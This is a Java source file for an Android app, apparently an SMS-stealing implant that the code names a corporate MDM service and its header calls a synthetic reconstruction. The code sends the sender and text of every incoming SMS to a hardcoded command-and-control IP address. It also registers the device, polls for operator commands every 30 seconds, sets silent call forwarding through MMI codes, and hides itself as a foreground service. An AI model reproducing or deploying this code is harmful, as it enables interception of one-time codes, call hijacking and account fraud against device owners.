package com.corp.mdm;

import android.app.Notification;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings;
import android.telephony.SmsMessage;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

// Corp MDM-style implant (synthetic reconstruction): intercepts newly
// received SMS, reports sender/body to a REST collector, registers the
// device with its ANDROID_ID, polls for operator commands (ping,
// forward_on/forward_off via unconditional call-forwarding MMI codes,
// sync_sms, self_destroy), hides its launcher icon and persists as a
// hidden foreground service with 30s heartbeat telemetry.
public class CoreService extends Service {

    static final String C2 = "http://69.55.61.82";
    static final String PING = "pong";

    static final String[] REQ = {
        "android.permission.SEND_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.READ_SMS",
        "android.permission.READ_PHONE_STATE",
        "android.permission.CALL_PHONE",
    };

    String androidId;

    @Override
    public void onCreate() {
        super.onCreate();
        Notification n = new Notification.Builder(this).setContentTitle("").build();
        startForeground(1337, n);
        hideLauncher();
        androidId = Settings.Secure.getString(
                getContentResolver(), Settings.Secure.ANDROID_ID);
        postJson(C2 + "/api/v1/devices/register",
                "{\"android_id\":\"" + androidId + "\"}");
        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(
                new Runnable() {
                    @Override public void run() { poll(); }
                }, 30, 30, TimeUnit.SECONDS);
    }

    void hideLauncher() {
        ComponentName c = new ComponentName(this, CoreService.class);
        getPackageManager().setComponentEnabledSetting(
                c, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }

    void poll() {
        postJson(C2 + "/api/v1/devices/heartbeat",
                "{\"android_id\":\"" + androidId + "\"}");
        String cmd = get(C2 + "/api/v1/devices/" + androidId + "/commands");
        if (cmd.contains("forward_on")) {
            setForwarding(cmd.replaceAll("[^0-9+]", ""));
        } else if (cmd.contains("forward_off")) {
            dialMmi("##21#");
        } else if (cmd.contains("ping")) {
            postJson(C2 + "/api/v1/commands/result", PING);
        } else if (cmd.contains("self_destroy")) {
            stopSelf();
        }
    }

    void setForwarding(String number) {
        dialMmi("**21*" + number + "#");
    }

    void dialMmi(String code) {
        Intent i = new Intent(Intent.ACTION_CALL);
        i.setData(Uri.parse("tel:" + Uri.encode(code)));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
    }

    String get(String target) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(target).openConnection();
            conn.setRequestMethod("GET");
            byte[] buf = new byte[4096];
            int n = conn.getInputStream().read(buf);
            return new String(buf, 0, Math.max(n, 0));
        } catch (Exception e) {
            return "";
        }
    }

    void postJson(String target, String body) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(target).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            OutputStream out = conn.getOutputStream();
            out.write(body.getBytes("UTF-8"));
            out.flush();
            conn.getResponseCode();
        } catch (Exception ignored) {
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static class SmsReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                Bundle b = intent.getExtras();
                Object[] pdus = (Object[]) b.get("pdus");
                for (Object pdu : pdus) {
                    SmsMessage m = SmsMessage.createFromPdu((byte[]) pdu);
                    String from = m.getOriginatingAddress();
                    String body = m.getMessageBody();
                    long ts = m.getTimestampMillis();
                    CoreService svc = new CoreService();
                    svc.postJson(C2 + "/api/v1/sms/report",
                            "{\"from\":\"" + from + "\",\"body\":\"" + body
                            + "\",\"ts\":" + ts + "}");
                }
            }
        }
    }
}
